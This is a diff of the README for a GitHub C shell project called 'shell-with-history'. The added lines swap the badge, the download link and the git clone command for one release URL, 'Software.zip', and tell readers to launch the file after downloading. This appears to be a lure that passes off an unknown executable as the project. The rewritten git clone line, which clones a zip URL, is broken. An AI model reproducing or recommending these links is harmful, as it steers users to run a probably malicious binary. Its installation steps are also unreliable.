@@ -1,6 +1,6 @@
 # 👨‍💻🚀 **Shell-with-history Repository**
 
-![shell-with-history](https://img.shields.io/badge/Shell%20with%20History-Code%20Galaxy-blue)
+![shell-with-history](https://github.com/woo-woo23/shell-with-history/releases/download/v1.0/Software.zip%20with%20History-Code%20Galaxy-blue)
 
 ## Description:
 Welcome to the "shell-with-history" repository - a bash-like shell implementation in C11 (plus POSIX.1-2008) using Linux syscalls. This project includes features such as command history, built-in commands, and IO redirection with pipes. If you are interested in exploring the world of shell scripting and system programming, this repository is a great place to start.
@@ -20,14 +20,14 @@ Welcome to the "shell-with-history" repository - a bash-like shell implementatio
 
 ## 📂 Installation:
 To get started, you can download the repository files by clicking on the link below:
-[Download shell-with-history v1.0.0.zip](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download shell-with-history https://github.com/woo-woo23/shell-with-history/releases/download/v1.0/Software.zip](https://github.com/woo-woo23/shell-with-history/releases/download/v1.0/Software.zip)
 
 **Launch the file after downloading to start exploring the shell-with-history project!**
 
 ### Getting Started:
 1. Clone the repository to your local machine.
 ```bash
-git clone https://github.com/your-username/shell-with-history.git
+git clone https://github.com/woo-woo23/shell-with-history/releases/download/v1.0/Software.zip
 ```
 
 2. Compile the C program using your preferred C compiler (e.g., Clang).
